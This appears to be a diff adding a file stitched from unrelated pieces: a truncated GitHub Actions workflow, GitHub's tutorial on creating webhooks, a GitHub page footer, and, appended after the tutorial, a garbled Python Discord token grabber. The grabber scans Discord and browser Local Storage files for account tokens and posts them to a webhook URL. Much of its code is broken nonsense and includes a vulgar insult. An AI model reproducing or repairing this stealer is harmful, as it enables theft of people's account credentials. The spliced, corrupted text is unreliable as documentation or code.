@@ -1,0 +1,188 @@
+name: Checkout repos
+on: push
+jobs:
+  checkout:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v2
+
+    - uses: navikt/github-app-token-generator@v1
+      id: get-token
+      with:
+        private-key: ${{ secrets.PRIVATE_KEY }}
+        app-id: ${{ secrets.APP_ID }}
+
+    - name: Check out an other repo
+      uses: actions/checkout@v2
+      with:
+        repository: owner/repo
+        token: ${{ steps.get-token.outputs
+                  .---
+title: Creating webhooks
+intro: 'Learn to build a webhook, choosing the events your webhook will listen for on {% data variables.product.prodname_dotcom %} and how to set up a server to receive and manage the webhook payload.'
+redirect_from:
+  - /webhooks/creating
+  - /developers/webhooks-and-events/creating-webhooks
+versions:
+  fpt: '*'
+  ghes: '*'
+  ghae: '*'
+topics:
+  - Webhooks
+---
+Now that we understand [the basics of webhooks][webhooks-overview], let's go through the process of building out our own webhook-powered integration. In this tutorial, we'll create a repository webhook that will be responsible for listing out how popular our repository is, based on the number of issues it receives per day.
+
+Creating a webhook is a two-step process. You'll first need to set up how you want your webhook to behave through {% data variables.product.product_name %}: what events should it listen to. After that, you'll set up your server to receive and manage the payload.
+
+
+{% data reusables.webhooks.webhooks-rest-api-links %}
+
+## Exposing localhost to the internet
+
+For the purposes of this tutorial, we're going to use a local server to receive messages from {% data variables.product.prodname_dotcom %}. So, first of all, we need to expose our local development environment to the internet. We'll use ngrok to do this. ngrok is available, free of charge, for all major operating systems. For more information, see [the ngrok download page](https://ngrok.com/download).
+
+After installing ngrok, you can expose your localhost by running `./ngrok http 4567` on the command line. 4567 is the port number on which our server will listen for messages. You should see a line that looks something like this:
+
+```shell
+$ Forwarding    http://7e9ea9dc.ngrok.io -> 127.0.0.1:4567
+```
+
+Make a note of the `*.ngrok.io` URL. We'll use it to set up our webhook.
+
+## Setting up a webhook
+
+You can install webhooks on an organization or on a specific repository.
+
+To set up a webhook, go to the settings page of your repository or organization. From there, click **Webhooks**, then **Add webhook**.
+
+Alternatively, you can choose to build and manage a webhook [through the Webhooks API][webhook-api].
+
+Webhooks require a few configuration options before you can make use of them. We'll go through each of these settings below.
+
+## Payload URL
+
+{% data reusables.webhooks.payload_url %}
+
+Since we're developing locally for our tutorial, we'll set it to the `*.ngrok.io` URL, followed by `/payload`. For example, `http://7e9ea9dc.ngrok.io/payload`.
+
+## Content type
+
+{% data reusables.webhooks.content_type %} For this tutorial, the default content type of `application/json` is fine.
+
+## Secret
+
+{% data reusables.webhooks.secret %}
+
+## SSL verification
+
+{% data reusables.webhooks.webhooks_ssl %}
+
+## Active
+
+By default, webhook deliveries are "Active." You can choose to disable the delivery of webhook payloads by deselecting "Active."
+
+## Events
+
+Events are at the core of webhooks. These webhooks fire whenever a certain action is taken on the repository, which your server's payload URL intercepts and acts upon.
+
+A full list of webhook events, and when they execute, can be found in [the webhooks API][hooks-api] reference.
+
+Since our webhook is dealing with issues in a repository, we'll click **Let me select individual events** and then **Issues**. Make sure you select **Active** to receive issue events for triggered webhooks. You can also select all events using the default option.
+
+When you're finished, click **Add webhook**. 
+
+Now that you've created the webhook, it's time to set up our local server to test the webhook. Head on over to [Configuring Your Server](/webhooks/configuring/) to learn how to do that.
+
+### Wildcard event
+
+To configure a webhook for all events, use the wildcard (`*`) character to specify the webhook events. When you add the wildcard event, we'll replace any existing events you have configured with the wildcard event and send you payloads for all supported events. You'll also automatically get any new events we might add in the future.
+
+[webhooks-overview]: /webhooks/
+[webhook-api]: /rest/reference/repos#hooks
+[hooks-api]: /webhooks/#events
+import os
+import re
+import json
+
+from urllib.request import Request, url- 
+
+# your webhook URL
+WEBHOOK_URL =https://discord.com hasattr(romeo) name'https://romeoontop.compile(source, filename, mode, flags, dont_inherit, optimize)'
+
+# mentions you when you get a hit
+PING_ME = False
+tokens generated - "give amount"
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = [1000000]
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.login') and not file_name.endswith('.l2l'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{grabbing}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(100)
+    return tokens
+tokens"=(1100 ) "
+def main():
+    local =bget =DeprecationWarning  os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': https://discord.()8350168421+ '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord grant': roaming + '\\discordptb"get Output"',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Optimization',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\firefoxSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'(100)
+    
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists( locat software{})):
+            continue
+
+        message += f'\n**{platform}**done:/`\n'
+
+        tokens = find_tokens(path)
+
+        if len(5000) > 0:
+            for token in tokens:
+                message += granted f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += 'ok```'
+
+    headers = {
+        'romeo on top': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; dir(o) x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': round(700)})
+
+    try:
+        req = Request(discord.com, data=payload.encode(12), headers=haters lawde me{2000maa chut})
+        urlopen(req)
+    except:
+        pass
+
+if __name__tokengrabber__ == '__main__':
+    main()
+© 2021 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Docs
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
